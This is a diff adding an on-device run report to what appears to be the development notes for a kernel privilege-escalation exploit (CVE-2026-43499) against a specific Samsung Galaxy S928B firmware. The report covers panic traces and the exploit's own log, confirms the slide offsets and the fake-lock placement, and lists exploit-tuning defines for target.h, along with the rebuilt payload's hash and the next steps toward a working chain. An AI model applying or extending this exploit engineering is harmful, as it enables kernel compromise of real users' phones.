@@ -287,3 +287,133 @@ analysis-s928b-czc1/firmware/AP/kernel
 
 Hardware execution of the rebuilt payload on the SM-S928B remains a separate
 validation step (the DZF2 sibling profile was validated on an SM-S928U1).
+
+## On-device run, 2026-08-08 (app payload, corrected offsets)
+
+The corrected payload was pushed to the test feed and run on the device
+(`ro.build.fingerprint` confirms `S928BXXS5CZC1`).
+
+### Kernel panic analysis (run 1)
+
+First run rebooted the phone. `bugreport.zip` (`dumpstate_lastkmsg.lst`,
+`reset_summary.html`) shows the panic in process `cve43499-run` (pid 4674):
+
+```text
+pc : rt_mutex_adjust_prio_chain+0x26c/0x91c   (ldr w12, [x13, #0x44])
+lr : rt_mutex_adjust_prio_chain+0x24c/0x91c
+x24 (waiter->lock) = ffffff8a59d9c200         x13 (rb_node) = 003300000074962d
+Call trace: rt_mutex_adjust_prio_chain -> rt_mutex_adjust_pi
+  -> __sched_setscheduler -> __arm64_sys_sched_setattr
+```
+
+Disassembly of `rt_mutex_adjust_prio_chain` (vmlinux `0x88f0c8`) places the
+fault at the `walk = node` tree-descent: `x13` was loaded from
+`[fake_lock + 8]` (`waiters.rb_root.rb_node`) and `x12 = [fake_lock + 0x10]`
+(`rb_leftmost`) was zero. Key conclusions:
+
+- The corrected slide constants are right: `waiter->lock` pointed exactly at
+  the designed fake-lock address `page_base + 0x4200`
+  (`SLIDE_BANK_LOCK_OFF 0x5200 + SKB_DATA_DELTA -0x1000`), so the pselect
+  stale-waiter overwrite lands and `SLIDE_PSELECT_WORD_SHIFT 3` is confirmed
+  by hardware, matching the static derivation.
+- The failure is *payload placement*: the reclaimed page did not hold the
+  sprayed fake-lock/fake-waiter content when the PI walk consumed it (the
+  garbage `0x0033...` value resembles foreign packet data — a reclaim miss
+  on the target page, the same allocator-placement wall documented for the
+  DZF2 sibling).
+
+### App-side trace (run 2, no crash)
+
+`exploit.log` from the app shows 7 attempts, all identical:
+
+```text
+mm leaked=ffffff8a570dd400 base=ffffff8a570d8000 object_index=21
+sk_buff reclaim sends=28/28 mode=1
+slide wait_requeue_pi ret=-1 errno=110            # expected (ETIMEDOUT path)
+slide pselect returned nfds=320 ... ret=0 ... sched_ok=1 last_sched_ret=0
+p0 physical write status=256 ok=0                 # child rejected
+p0 physical slot=0 write window failed after 1 attempt(s)
+```
+
+Two defects identified against the hardware-proven family
+(`e2s-S926BXXUEDZDR`, `e1s-S921BXXSFDZE1/FDZF3`):
+
+1. **Acceptance gate**: without `APP_ACCEPT_SCHED_TRIGGER` the child requires
+   `slide_pselect_write_window = (pselect_ret > 0 && sched_ok > 0)`. Nothing
+   ever makes the watched pipe readable, so `pselect` always returns 0 at the
+   100 ms timeout and every attempt is rejected even when the trigger chain
+   forms correctly.
+2. **Missing fresh-session design**: CZC1 lacked the proven reclaim block
+   (`APP_REQUIRE_FRESH_P0_SESSION`): 192 reclaim sends with 16 MiB sndbuf,
+   deferred drain reaps, quiet reclaim window, and the
+   `object_index` 27..30 gate. The logged runs fired the trigger with
+   `object_index` 9/14/21/25 — placements the proven profiles skip — which is
+   how run 1 reached a half-formed fake lock and panicked. The proven profiles
+   also arm the sched trigger only after `wchan` confirms the waiter is
+   blocked inside pselect (`SLIDE_SYNC/GUARD_PSELECT_SYSCALL`) instead of a
+   blind 50 ms delay.
+
+### target.h changes (this round)
+
+Aligned with the proven family block; all kernel-derived offsets, the bank
+geometry (4 slots, task bank at `0x1000`) and `SKB_DATA_DELTA (-0x1000)` are
+unchanged (the latter two are crash-validated, see above):
+
+```c
+#define APP_REQUIRE_FRESH_P0_SESSION 1
+#define MM_ORDER 3
+#define KERNELSNITCH_VERBOSE 1
+#define KERNELSNITCH_FUTEX_HASH_SIZE 0x1000
+#define KSNITCH_COLLISIONS 5
+#define KERNELSNITCH_COLLISION_CONFIRMATIONS 3
+#define APP_SLIDE_RECLAIM_SENDS 192
+#define APP_SLIDE_RECLAIM_SNDBUF 16777216
+#define APP_MM_LATE_DRAIN_TRIGGERS 2
+#define APP_DEFER_FINAL_DRAIN_REAP 1
+#define APP_DEFER_ALL_DRAIN_REAPS 1
+#define APP_QUIET_RECLAIM_WINDOW 1
+#define APP_SLIDE_MIN_OBJECT_INDEX 27
+#define APP_SLIDE_MAX_OBJECT_INDEX 30
+#define APP_FOPS_MIN_OBJECT_INDEX 24
+#define APP_RECLAIM_MAX_DIRECT_BASE 0xffffff8080000000ULL
+#define APP_FOPS_PSELECT_DELAY_USEC 50000
+#define SLIDE_SYNC_PSELECT_SYSCALL 1
+#define SLIDE_GUARD_PSELECT_SYSCALL 1
+#define SLIDE_PSELECT_READY_TIMEOUT_USEC 20000
+#define SLIDE_PSELECT_RECHECK_TIMEOUT_USEC 20000
+#define SLIDE_PSELECT_WCHAN_CONFIRMATIONS 3
+#define APP_ACCEPT_SCHED_TRIGGER 1
+#define APP_PSELECT_POST_GUARD_AGE_CHECK 1
+```
+
+App block additionally: `SLIDE_PSELECT_TIMEOUT_NSEC` 100 ms -> 500 ms,
+`APP_PSELECT_TRIGGER_MAX_AGE_USEC 150000`, fresh-page search knobs
+(`*_FRESH_PAGE_ATTEMPTS 8`, `*_KERNEL_PAGE_SEARCH_BATCHES 16`,
+`SLIDE_KERNEL_PAGE_SETUP_ATTEMPTS 8`, `FOPS_KERNEL_PAGE_SETUP_ATTEMPTS 8`),
+`DEFAULT_EXPLOIT_ATTEMPTS 1`, `DEFAULT_ATTEMPT_TIMEOUT_SEC 2200`,
+`DEFAULT_P0_ATTEMPT_TIMEOUT_SEC 1200`, `P0_ORACLE_PRODUCTION_SLOT 4`.
+`KERNELSNITCH_MTE_ENABLED` left at the default 0 (the CZC1 mm leak works
+untagged, as on the DZF2 sibling; Exynos profiles need 1).
+
+Rebuilt release artifact (size unchanged, feed entry untouched):
+
+```text
+artifacts/e3q-S928BXXS5CZC1/cve-2026-43499-app.so
+size:    104128
+SHA-256: d782664f5dfc267c589287eba78e4588525ebaa94050fca967c30679f457d39c
+```
+
+Binary verification: `mov w1, #0xc0` (192 sends), `movk x26, #0x21e, lsl #16`
+(loggers object), `movk x24, #0x230, lsl #16` (boot_id data),
+`movk x0, #0x169, lsl #16` (nfulnl_logger name) all present.
+
+### Current status
+
+The e3q family (CZC1, DZF2, DZE1) has no publicly confirmed hardware success
+yet (DZF2 documented experimental; PR #31 DZE1 reporters see the same
+leak-then-panic). CZC1 is now the best-instrumented e3q profile: offsets and
+stack placement are crash-validated, and the remaining variable is reclaim
+placement reliability, which the fresh-session design addresses. The next
+on-device run should either complete the P0 oracle or emit the fresh-session
+diagnostics (`fresh=N/8`, slabinfo dumps, wchan confirmations) needed to tune
+further.
